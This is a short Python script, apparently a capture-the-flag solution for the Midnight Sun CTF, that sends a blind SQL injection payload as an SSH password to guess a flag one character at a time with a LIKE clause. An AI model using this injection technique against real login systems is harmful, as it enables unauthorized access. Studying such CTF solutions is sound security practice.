# ' or username = 'elliot' and password like 'midnight{Bl%' -- 
from pwnlib import *

host = 'fsociety-01.play.midnightsunctf.se'
port = 2222
username = 'elliot'
password = "' or (username = 'elliot' and password like 'midnight{{{password}%') -- ".format(password = 'C')
# print(port)
conn = tubes.ssh.ssh(username, host, port, password)
print conn.connected()